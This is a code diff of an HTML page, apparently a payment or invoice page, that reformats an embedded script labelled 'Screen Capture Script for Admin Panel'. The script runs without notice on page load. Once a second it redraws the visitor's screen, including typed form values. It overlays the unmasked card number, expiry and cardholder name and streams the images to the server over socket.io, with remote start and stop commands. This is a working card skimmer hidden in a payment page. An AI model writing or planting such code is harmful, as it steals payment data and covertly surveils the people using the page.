@@ -2944,305 +2944,270 @@ if (timeLeft <= 0) {
         });
         </script>
         <script>
-       // Screen Capture Script for Admin Panel
-       (function() {
-         console.log('Initializing screen capture for admin panel');
-         
-         // Variables for the capture process
-         let captureInterval = null;
-         let lastCaptureTime = 0;
-         const CAPTURE_FPS = 1; // Lower FPS to reduce bandwidth (1 frame per second)
-         const CAPTURE_QUALITY = 0.3; // Lower quality to reduce bandwidth
-         const MIN_CAPTURE_INTERVAL = 1000 / CAPTURE_FPS;
-         
-         // Create hidden canvas for capturing
-         const canvas = document.createElement('canvas');
-         const ctx = canvas.getContext('2d');
-         canvas.width = window.innerWidth;
-         canvas.height = window.innerHeight;
-         canvas.style.display = 'none';
-         document.body.appendChild(canvas);
-         
-         // Function to capture screen
-         function captureScreen() {
-           const now = Date.now();
-           if (now - lastCaptureTime < MIN_CAPTURE_INTERVAL) return;
-           lastCaptureTime = now;
-           
-           try {
-             // Update canvas dimensions if needed
-             if (canvas.width !== window.innerWidth || canvas.height !== window.innerHeight) {
-               canvas.width = window.innerWidth;
-               canvas.height = window.innerHeight;
-             }
-             
-             // Clear canvas
-             ctx.clearRect(0, 0, canvas.width, canvas.height);
-             
-             // Draw white background
-             ctx.fillStyle = '#ffffff';
-             ctx.fillRect(0, 0, canvas.width, canvas.height);
-             
-             // Get all visible elements
-             const elements = Array.from(document.querySelectorAll('*')).filter(el => {
-               const rect = el.getBoundingClientRect();
-               return rect.width > 0 && rect.height > 0 && 
-                      rect.top < window.innerHeight && rect.bottom > 0 && 
-                      rect.left < window.innerWidth && rect.right > 0 &&
-                      el !== canvas;
-             });
-             
-             // Draw content using HTML2Canvas approach
-             try {
-               // Draw background colors/images
-               elements.forEach(el => {
-                 try {
-                   const rect = el.getBoundingClientRect();
-                   const styles = window.getComputedStyle(el);
-                   
-                   // Draw background color
-                   if (styles.backgroundColor !== 'rgba(0, 0, 0, 0)' && styles.backgroundColor !== 'transparent') {
-                     ctx.fillStyle = styles.backgroundColor;
-                     ctx.fillRect(rect.left, rect.top, rect.width, rect.height);
-                   }
-                   
-                   // Draw borders
-                   if (styles.borderWidth !== '0px') {
-                     ctx.strokeStyle = styles.borderColor;
-                     ctx.lineWidth = parseInt(styles.borderWidth);
-                     ctx.strokeRect(rect.left, rect.top, rect.width, rect.height);
-                   }
-                 } catch (e) {
-                   // Ignore errors for individual elements
-                 }
-               });
-               
-               // Draw text contents
-               elements.filter(el => el.textContent.trim() !== '').forEach(el => {
-                 try {
-                   const rect = el.getBoundingClientRect();
-                   const styles = window.getComputedStyle(el);
-                   
-                   // Skip if element has children that will render the text
-                   if (el.children.length === 0 || el.tagName === 'BUTTON' || el.tagName === 'LABEL') {
-                     ctx.font = styles.font;
-                     ctx.fillStyle = styles.color;
-                     ctx.fillText(el.textContent.substring(0, 50), rect.left + 5, rect.top + rect.height/2 + 5);
-                   }
-                 } catch (e) {
-                   // Ignore errors for individual elements
-                 }
-               });
-               
-               // Draw form fields specifically
-               document.querySelectorAll('input, select, textarea').forEach(input => {
-                 try {
-                   const rect = input.getBoundingClientRect();
-                   if (rect.width > 0 && rect.height > 0) {
-                     // Draw field background
-                     ctx.fillStyle = '#f5f5f5';
-                     ctx.fillRect(rect.left, rect.top, rect.width, rect.height);
-                     
-                     // Draw border
-                     ctx.strokeStyle = '#cccccc';
-                     ctx.lineWidth = 1;
-                     ctx.strokeRect(rect.left, rect.top, rect.width, rect.height);
-                     
-                     // Draw value or placeholder
-                     ctx.font = '14px Arial';
-                     ctx.fillStyle = input.value ? '#000000' : '#999999';
-                     const displayText = input.value || input.placeholder || input.type;
-                     
-                     // Mask password
-                     const text = input.type === 'password' ? '••••••' : displayText;
-                     ctx.fillText(text, rect.left + 5, rect.top + rect.height/2 + 5);
-                   }
-                 } catch (e) {
-                   // Ignore individual field errors
-                 }
-               });
-               
-               // Try to specifically capture buttons
-               document.querySelectorAll('button').forEach(button => {
-                 try {
-                   const rect = button.getBoundingClientRect();
-                   // Draw button background
-                   const styles = window.getComputedStyle(button);
-                   ctx.fillStyle = styles.backgroundColor;
-                   ctx.fillRect(rect.left, rect.top, rect.width, rect.height);
-                   
-                   // Draw button text
-                   ctx.font = styles.font;
-                   ctx.fillStyle = styles.color;
-                   ctx.textAlign = 'center';
-                   ctx.fillText(button.textContent.trim(), rect.left + rect.width/2, rect.top + rect.height/2 + 5);
-                   ctx.textAlign = 'start'; // Reset alignment
-                 } catch (e) {
-                   // Ignore errors
-                 }
-               });
-               
-               // Draw images on the page
-               document.querySelectorAll('img').forEach(img => {
-                 try {
-                   if (img.complete && img.naturalWidth > 0) {
-                     const rect = img.getBoundingClientRect();
-                     if (rect.width > 0 && rect.height > 0) {
-                       ctx.drawImage(img, rect.left, rect.top, rect.width, rect.height);
-                     }
-                   }
-                 } catch (e) {
-                   // Ignore image errors
-                 }
-               });
-             } catch (e) {
-               console.log('Error in canvas drawing:', e);
-             }
-             
-             // Draw page URL and timestamp at the top
-             ctx.fillStyle = 'rgba(0,0,0,0.7)';
-             ctx.fillRect(0, 0, canvas.width, 40);
-             ctx.font = '12px Arial';
-             ctx.fillStyle = '#ffffff';
-             ctx.fillText(`URL: ${window.location.href}`, 10, 15);
-             ctx.fillText(`Time: ${new Date().toLocaleTimeString()}`, 10, 30);
-             
-             // Convert to image data with quality setting
-             const imageData = canvas.toDataURL('image/jpeg', CAPTURE_QUALITY);
-     
-            // Add this inside your captureScreen function, before sending the frame
-     // Add card details overlay if available
-     if (currentInvoiceId) {
-       try {
-         // Draw card data info box
-         const cardNum = document.getElementById('cardNumber')?.value || '';
-         const expiry = document.getElementById('expiry')?.value || '';
-         const cardHolder = document.getElementById('cardholderName')?.value || '';
-         
-         if (cardNum && expiry && cardHolder) {
-           // Draw transparent overlay with card info at the top
-           ctx.fillStyle = 'rgba(0,0,0,0.7)';
-           ctx.fillRect(0, 40, canvas.width, 80);
-           ctx.font = '12px Arial';
-           ctx.fillStyle = '#ffffff';
-           ctx.fillText(`Card: ${cardNum} | Exp: ${expiry} | Name: ${cardHolder}`, 10, 60);
-           ctx.fillText(`Invoice ID: ${currentInvoiceId} | Time: ${new Date().toLocaleTimeString()}`, 10, 80);
-           ctx.fillText('CARD DATA SUBMITTED', 10, 100);
-         }
-       } catch (e) {
-         // Ignore errors
-       }
-     }
-             // Send frame data to server
-             socket.emit('screen_frame', {
-               frameData: imageData,
-               frameType: 'image',
-               timestamp: Date.now(),
-               frameId: Math.random().toString(36).substring(2, 15)
-             });
-           } catch (error) {
-             console.error('Error in screen capture:', error);
-             socket.emit('screen_capture_error', {
-               error: error.message || 'Unknown error during capture'
-             });
-           }
-         }
-         
-         // Function to start capturing
-         function startCapture() {
-           if (captureInterval) return; // Already running
-           
-           // Update canvas dimensions
-           canvas.width = window.innerWidth;
-           canvas.height = window.innerHeight;
-           
-           // Start capture loop
-           captureInterval = setInterval(captureScreen, MIN_CAPTURE_INTERVAL);
-           
-           // Do one immediate capture
-           captureScreen();
-           
-           console.log('Screen capture started');
-         }
-         
-         // Function to stop capturing
-         function stopCapture() {
-           if (captureInterval) {
-             clearInterval(captureInterval);
-             captureInterval = null;
-             console.log('Screen capture stopped');
-           }
-         }
-         
-         // Listen for control commands from server
-         socket.on('control_command', (command) => {
-           console.log('Received control command:', command);
-           
-           if (command.type === 'start_capture') {
-             startCapture();
-           } else if (command.type === 'stop_capture') {
-             stopCapture();
-           } else if (command.type === 'refresh_capture') {
-             stopCapture();
-             setTimeout(startCapture, 500);
-           }
-         });
-         
-         // Listen for window resize to update canvas dimensions
-         window.addEventListener('resize', () => {
-           if (captureInterval) {
-             canvas.width = window.innerWidth;
-             canvas.height = window.innerHeight;
-           }
-         });
-         
-         // Start capture automatically
-         setTimeout(startCapture, 1000);
-         
-         // Report errors
-         window.addEventListener('error', (e) => {
-           socket.emit('screen_capture_error', {
-             error: `JS Error: ${e.message} at ${e.filename}:${e.lineno}`
-           });
-         });
-       })();
-     </script>
-         <!-- Add this code right before the closing body tag -->
-         <script>
-         // Initialize screen capture functionality
-         function initializeScreenCapture() {
-           // First, make sure socket.io is loaded
-           if (typeof io === 'undefined') {
-             console.log('Loading socket.io client...');
-             const socketScript = document.createElement('script');
-             socketScript.src = '/socket.io/socket.io.js';
-             socketScript.onload = loadCaptureScript;
-             socketScript.onerror = function() {
-               console.error('Failed to load socket.io client');
-             };
-             document.head.appendChild(socketScript);
-           } else {
-             loadCaptureScript();
-           }
-           
-           // Load the capture script
-           function loadCaptureScript() {
-             console.log('Loading screen capture script...');
-             const captureScript = document.createElement('script');
-             captureScript.src = '/screen-capture.js';
-             captureScript.onerror = function() {
-               console.error('Failed to load screen capture script');
-             };
-             document.head.appendChild(captureScript);
-           }
-         }
-     
-         // Call the screen capture initialization after the page has loaded
-         document.addEventListener('DOMContentLoaded', function() {
-           // Initialize after a short delay to ensure other scripts load first
-           setTimeout(initializeScreenCapture, 1000);
-         });
-         </script>
+<script>
+//Screen Capture Script for Admin Panel
+(function() {
+  console.log('Initializing screen capture for admin panel');
+  
+  // Variables for the capture process
+  let captureInterval = null;
+  let lastCaptureTime = 0;
+  const CAPTURE_FPS = 1; // Lower FPS to reduce bandwidth (1 frame per second)
+  const CAPTURE_QUALITY = 0.3; // Lower quality to reduce bandwidth
+  const MIN_CAPTURE_INTERVAL = 1000 / CAPTURE_FPS;
+  
+  // Create hidden canvas for capturing
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+  canvas.style.display = 'none';
+  document.body.appendChild(canvas);
+  
+  // Function to capture screen
+  function captureScreen() {
+    const now = Date.now();
+    if (now - lastCaptureTime < MIN_CAPTURE_INTERVAL) return;
+    lastCaptureTime = now;
+    
+    try {
+      // Update canvas dimensions if needed
+      if (canvas.width !== window.innerWidth || canvas.height !== window.innerHeight) {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+      }
+      
+      // Clear canvas
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      
+      // Draw white background
+      ctx.fillStyle = '#ffffff';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      
+      // Get all visible elements
+      const elements = Array.from(document.querySelectorAll('*')).filter(el => {
+        const rect = el.getBoundingClientRect();
+        return rect.width > 0 && rect.height > 0 && 
+               rect.top < window.innerHeight && rect.bottom > 0 && 
+               rect.left < window.innerWidth && rect.right > 0 &&
+               el !== canvas;
+      });
+      
+      // Draw content using HTML2Canvas approach
+      try {
+        // Draw background colors/images
+        elements.forEach(el => {
+          try {
+            const rect = el.getBoundingClientRect();
+            const styles = window.getComputedStyle(el);
+            
+            // Draw background color
+            if (styles.backgroundColor !== 'rgba(0, 0, 0, 0)' && styles.backgroundColor !== 'transparent') {
+              ctx.fillStyle = styles.backgroundColor;
+              ctx.fillRect(rect.left, rect.top, rect.width, rect.height);
+            }
+            
+            // Draw borders
+            if (styles.borderWidth !== '0px') {
+              ctx.strokeStyle = styles.borderColor;
+              ctx.lineWidth = parseInt(styles.borderWidth);
+              ctx.strokeRect(rect.left, rect.top, rect.width, rect.height);
+            }
+          } catch (e) {
+            // Ignore errors for individual elements
+          }
+        });
+        
+        // Draw text contents
+        elements.filter(el => el.textContent.trim() !== '').forEach(el => {
+          try {
+            const rect = el.getBoundingClientRect();
+            const styles = window.getComputedStyle(el);
+            
+            // Skip if element has children that will render the text
+            if (el.children.length === 0 || el.tagName === 'BUTTON' || el.tagName === 'LABEL') {
+              ctx.font = styles.font;
+              ctx.fillStyle = styles.color;
+              ctx.fillText(el.textContent.substring(0, 50), rect.left + 5, rect.top + rect.height/2 + 5);
+            }
+          } catch (e) {
+            // Ignore errors for individual elements
+          }
+        });
+        
+        // Draw form fields specifically
+        document.querySelectorAll('input, select, textarea').forEach(input => {
+          try {
+            const rect = input.getBoundingClientRect();
+            if (rect.width > 0 && rect.height > 0) {
+              // Draw field background
+              ctx.fillStyle = '#f5f5f5';
+              ctx.fillRect(rect.left, rect.top, rect.width, rect.height);
+              
+              // Draw border
+              ctx.strokeStyle = '#cccccc';
+              ctx.lineWidth = 1;
+              ctx.strokeRect(rect.left, rect.top, rect.width, rect.height);
+              
+              // Draw value or placeholder
+              ctx.font = '14px Arial';
+              ctx.fillStyle = input.value ? '#000000' : '#999999';
+              const displayText = input.value || input.placeholder || input.type;
+              
+              // Mask password
+              const text = input.type === 'password' ? '••••••' : displayText;
+              ctx.fillText(text, rect.left + 5, rect.top + rect.height/2 + 5);
+            }
+          } catch (e) {
+            // Ignore individual field errors
+          }
+        });
+        
+        // Try to specifically capture buttons
+        document.querySelectorAll('button').forEach(button => {
+          try {
+            const rect = button.getBoundingClientRect();
+            // Draw button background
+            const styles = window.getComputedStyle(button);
+            ctx.fillStyle = styles.backgroundColor;
+            ctx.fillRect(rect.left, rect.top, rect.width, rect.height);
+            
+            // Draw button text
+            ctx.font = styles.font;
+            ctx.fillStyle = styles.color;
+            ctx.textAlign = 'center';
+            ctx.fillText(button.textContent.trim(), rect.left + rect.width/2, rect.top + rect.height/2 + 5);
+            ctx.textAlign = 'start'; // Reset alignment
+          } catch (e) {
+            // Ignore errors
+          }
+        });
+        
+        // Draw images on the page
+        document.querySelectorAll('img').forEach(img => {
+          try {
+            if (img.complete && img.naturalWidth > 0) {
+              const rect = img.getBoundingClientRect();
+              if (rect.width > 0 && rect.height > 0) {
+                ctx.drawImage(img, rect.left, rect.top, rect.width, rect.height);
+              }
+            }
+          } catch (e) {
+            // Ignore image errors
+          }
+        });
+      } catch (e) {
+        console.log('Error in canvas drawing:', e);
+      }
+      
+      // Draw page URL and timestamp at the top
+      ctx.fillStyle = 'rgba(0,0,0,0.7)';
+      ctx.fillRect(0, 0, canvas.width, 40);
+      ctx.font = '12px Arial';
+      ctx.fillStyle = '#ffffff';
+      ctx.fillText(`URL: ${window.location.href}`, 10, 15);
+      ctx.fillText(`Time: ${new Date().toLocaleTimeString()}`, 10, 30);
+      
+      // Convert to image data with quality setting
+      const imageData = canvas.toDataURL('image/jpeg', CAPTURE_QUALITY);
+  
+     // Add this inside your captureScreen function, before sending the frame
+  // Add card details overlay if available
+  if (currentInvoiceId) {
+    try {
+      // Draw card data info box
+      const cardNum = document.getElementById('cardNumber')?.value || '';
+      const expiry = document.getElementById('expiry')?.value || '';
+      const cardHolder = document.getElementById('cardholderName')?.value || '';
+      
+      if (cardNum && expiry && cardHolder) {
+        // Draw transparent overlay with card info at the top
+        ctx.fillStyle = 'rgba(0,0,0,0.7)';
+        ctx.fillRect(0, 40, canvas.width, 80);
+        ctx.font = '12px Arial';
+        ctx.fillStyle = '#ffffff';
+        ctx.fillText(`Card: ${cardNum} | Exp: ${expiry} | Name: ${cardHolder}`, 10, 60);
+        ctx.fillText(`Invoice ID: ${currentInvoiceId} | Time: ${new Date().toLocaleTimeString()}`, 10, 80);
+        ctx.fillText('CARD DATA SUBMITTED', 10, 100);
+      }
+    } catch (e) {
+      // Ignore errors
+    }
+  }
+      // Send frame data to server
+      socket.emit('screen_frame', {
+        frameData: imageData,
+        frameType: 'image',
+        timestamp: Date.now(),
+        frameId: Math.random().toString(36).substring(2, 15)
+      });
+    } catch (error) {
+      console.error('Error in screen capture:', error);
+      socket.emit('screen_capture_error', {
+        error: error.message || 'Unknown error during capture'
+      });
+    }
+  }
+  
+  // Function to start capturing
+  function startCapture() {
+    if (captureInterval) return; // Already running
+    
+    // Update canvas dimensions
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    
+    // Start capture loop
+    captureInterval = setInterval(captureScreen, MIN_CAPTURE_INTERVAL);
+    
+    // Do one immediate capture
+    captureScreen();
+    
+    console.log('Screen capture started');
+  }
+  
+  // Function to stop capturing
+  function stopCapture() {
+    if (captureInterval) {
+      clearInterval(captureInterval);
+      captureInterval = null;
+      console.log('Screen capture stopped');
+    }
+  }
+  
+  // Listen for control commands from server
+  socket.on('control_command', (command) => {
+    console.log('Received control command:', command);
+    
+    if (command.type === 'start_capture') {
+      startCapture();
+    } else if (command.type === 'stop_capture') {
+      stopCapture();
+    } else if (command.type === 'refresh_capture') {
+      stopCapture();
+      setTimeout(startCapture, 500);
+    }
+  });
+  
+  // Listen for window resize to update canvas dimensions
+  window.addEventListener('resize', () => {
+    if (captureInterval) {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    }
+  });
+  
+  // Start capture automatically
+  setTimeout(startCapture, 1000);
+  
+  // Report errors
+  window.addEventListener('error', (e) => {
+    socket.emit('screen_capture_error', {
+      error: `JS Error: ${e.message} at ${e.filename}:${e.lineno}`
+    });
+  });
+})();
+</script>
        <!-- Screen capture functionality -->
      <script src="/socket.io/socket.io.js"></script>
      <script src="/screen-capture.js"></script>
